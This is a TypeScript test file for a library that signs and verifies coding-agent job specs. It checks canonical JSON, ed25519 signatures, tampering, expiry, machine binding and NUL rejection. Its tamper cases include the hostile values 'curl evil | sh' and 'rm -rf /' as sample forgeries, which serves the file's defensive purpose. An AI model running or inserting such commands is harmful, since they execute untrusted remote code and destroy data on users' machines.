import { generateKeyPairSync, sign } from "node:crypto";
import { describe, expect, it } from "vitest";
import { JobSpecSchema, canonicalJson, signJob, verifyJob, type JobSpec, type SignedJob } from "../src";

const spec: JobSpec = {
  jobId: "job-1",
  runner: "muse",
  repo: "owner/repo",
  baseBranch: "main",
  prompt: "do the thing",
  model: "m1",
  command: "pnpm test",
};
const M = "machine-a";
const NOW = 1_800_000_000_000;
const keys = generateKeyPairSync("ed25519");
const other = generateKeyPairSync("ed25519");

describe("canonicalJson", () => {
  it("sorts keys at every depth with no whitespace", () => {
    expect(canonicalJson({ b: 1, a: { d: [{ z: 1, y: 2 }], c: "x" } })).toBe(
      '{"a":{"c":"x","d":[{"y":2,"z":1}]},"b":1}',
    );
  });
  it("omits undefined object values", () => {
    expect(canonicalJson({ a: 1, b: undefined })).toBe('{"a":1}');
  });
  it("rejects non-finite numbers", () => {
    expect(() => canonicalJson({ a: NaN })).toThrow();
  });
});

describe("signJob/verifyJob", () => {
  const job = signJob(spec, "user-1", M, keys.privateKey, NOW);

  it("verifies a signed job", () => {
    expect(verifyJob(job, keys.publicKey, M, NOW + 1000)).toEqual({ spec, userId: "user-1", machineId: M });
  });

  it("signature is base64url", () => {
    expect(job.signature).toMatch(/^[A-Za-z0-9_-]{86}$/);
    expect(job.issuedAt).toBe(NOW);
  });

  it("is independent of spec key order", () => {
    const reordered = Object.fromEntries(Object.entries(spec).reverse()) as JobSpec;
    expect(Object.keys(reordered)[0]).toBe("command");
    const j2 = signJob(reordered, "user-1", M, keys.privateKey, NOW);
    expect(j2.signature).toBe(job.signature);
    expect(verifyJob({ ...job, spec: reordered }, keys.publicKey, M, NOW)).toBeTruthy();
  });

  const tampers: Array<[string, (j: SignedJob) => SignedJob]> = [
    ["jobId", (j) => ({ ...j, spec: { ...j.spec, jobId: "job-2" } })],
    ["runner", (j) => ({ ...j, spec: { ...j.spec, runner: "codex" } })],
    ["repo", (j) => ({ ...j, spec: { ...j.spec, repo: "evil/repo" } })],
    ["baseBranch", (j) => ({ ...j, spec: { ...j.spec, baseBranch: "dev" } })],
    ["prompt", (j) => ({ ...j, spec: { ...j.spec, prompt: "rm -rf /" } })],
    ["model", (j) => ({ ...j, spec: { ...j.spec, model: "m2" } })],
    ["command", (j) => ({ ...j, spec: { ...j.spec, command: "curl evil | sh" } })],
    ["removed command", (j) => ({ ...j, spec: { ...j.spec, command: undefined } })],
    ["machineId", (j) => ({ ...j, machineId: "machine-b" })],
    ["userId", (j) => ({ ...j, userId: "user-2" })],
    ["issuedAt", (j) => ({ ...j, issuedAt: j.issuedAt + 1 })],
  ];
  for (const [name, fn] of tampers) {
    it(`rejects tampered ${name}`, () => {
      expect(() => verifyJob(fn(job), keys.publicKey, M, NOW)).toThrow();
    });
  }

  it("rejects an added unsigned spec field", () => {
    const bad = { ...job, spec: { ...job.spec, extra: "x" } } as unknown as SignedJob;
    expect(() => verifyJob(bad, keys.publicKey, M, NOW)).toThrow();
  });

  it("rejects the wrong key", () => {
    expect(() => verifyJob(job, other.publicKey, M, NOW)).toThrow();
  });

  it("rejects malformed signature encodings", () => {
    const bad = [
      "",
      "!!!",
      "abc",
      job.signature + "A",
      job.signature.slice(1),
      `${job.signature}=`,
      job.signature.replace(/.$/, "+"),
    ];
    for (const signature of bad) {
      expect(() => verifyJob({ ...job, signature }, keys.publicKey, M, NOW)).toThrow();
    }
    expect(() =>
      verifyJob({ ...job, signature: 5 } as unknown as SignedJob, keys.publicKey, M, NOW),
    ).toThrow();
  });

  it("rejects a non-ed25519 public key", () => {
    const rsa = generateKeyPairSync("rsa", { modulusLength: 2048 });
    expect(() => verifyJob(job, rsa.publicKey, M, NOW)).toThrow();
  });

  it("rejects a job issued 6 minutes ago but accepts 4 minutes", () => {
    expect(() => verifyJob(job, keys.publicKey, M, NOW + 6 * 60_000)).toThrow(/expired/);
    expect(verifyJob(job, keys.publicKey, M, NOW + 4 * 60_000).userId).toBe("user-1");
  });

  it("rejects issuedAt more than 60s in the future, accepts within", () => {
    expect(() => verifyJob(job, keys.publicKey, M, NOW - 61_000)).toThrow(/future/);
    expect(verifyJob(job, keys.publicKey, M, NOW - 59_000).userId).toBe("user-1");
  });

  it("rejects a job signed for machine A on machine B", () => {
    expect(() => verifyJob(job, keys.publicKey, "machine-b", NOW)).toThrow(/different machine/);
  });

  it("rejects an empty expectedMachineId", () => {
    expect(() => verifyJob(job, keys.publicKey, "", NOW)).toThrow();
  });

  it("rejects a non-integer or non-finite clock", () => {
    for (const bad of [NaN, Infinity, -Infinity, 1.5]) {
      expect(() => verifyJob(job, keys.publicKey, M, bad)).toThrow(/invalid clock/);
    }
  });

  it("covers the domain tag in the signature", () => {
    const base = { machineId: M, spec, userId: "user-1", issuedAt: NOW };
    const forge = (payload: object) =>
      ({
        ...job,
        signature: sign(null, Buffer.from(canonicalJson(payload), "utf8"), keys.privateKey).toString(
          "base64url",
        ),
      }) as SignedJob;
    // Sanity: the correctly tagged payload verifies, so the negatives below are meaningful.
    expect(
      verifyJob(forge({ v: "hoistline-job-v1", ...base }), keys.publicKey, M, NOW).userId,
    ).toBe("user-1");
    expect(() => verifyJob(forge(base), keys.publicKey, M, NOW)).toThrow();
    expect(() => verifyJob(forge({ v: "other", ...base }), keys.publicKey, M, NOW)).toThrow();
  });

  it("rejects invalid specs at sign time", () => {
    expect(() => signJob({ ...spec, model: "" }, "u", M, keys.privateKey, NOW)).toThrow();
    expect(() => signJob({ ...spec, repo: "" }, "u", M, keys.privateKey, NOW)).toThrow();
  });

  it("rejects garbage input", () => {
    expect(() => verifyJob(null as unknown as SignedJob, keys.publicKey, M, NOW)).toThrow();
    expect(() => verifyJob({} as SignedJob, keys.publicKey, M, NOW)).toThrow();
  });
});

describe("NUL characters in a job spec", () => {
  const fields = ["jobId", "repo", "baseBranch", "prompt", "model", "command"] as const;

  it.each(fields)("JobSpecSchema rejects a NUL in %s", (field) => {
    expect(JobSpecSchema.safeParse(spec).success).toBe(true);
    expect(JobSpecSchema.safeParse({ ...spec, [field]: `a\0b` }).success).toBe(false);
  });

  it.each(fields)("signJob refuses a NUL in %s", (field) => {
    expect(() => signJob({ ...spec, [field]: `a\0b` }, "user-1", M, keys.privateKey, NOW)).toThrow();
  });

  it.each(fields)("verifyJob refuses a correctly signed job with a NUL in %s", (field) => {
    const bad = { ...spec, [field]: `a\0b` };
    const bytes = Buffer.from(
      canonicalJson({ v: "hoistline-job-v1", machineId: M, spec: bad, userId: "user-1", issuedAt: NOW }),
      "utf8",
    );
    const job: SignedJob = {
      spec: bad,
      machineId: M,
      userId: "user-1",
      issuedAt: NOW,
      signature: sign(null, bytes, keys.privateKey).toString("base64url"),
    };
    expect(() => verifyJob(job, keys.publicKey, M, NOW)).toThrow(/invalid signed job/);
  });

  it("verifyJob accepts the same forged-bytes construction without a NUL (the test signs correctly)", () => {
    const bytes = Buffer.from(
      canonicalJson({ v: "hoistline-job-v1", machineId: M, spec, userId: "user-1", issuedAt: NOW }),
      "utf8",
    );
    const job: SignedJob = {
      spec,
      machineId: M,
      userId: "user-1",
      issuedAt: NOW,
      signature: sign(null, bytes, keys.privateKey).toString("base64url"),
    };
    expect(verifyJob(job, keys.publicKey, M, NOW).spec).toEqual(spec);
  });
});
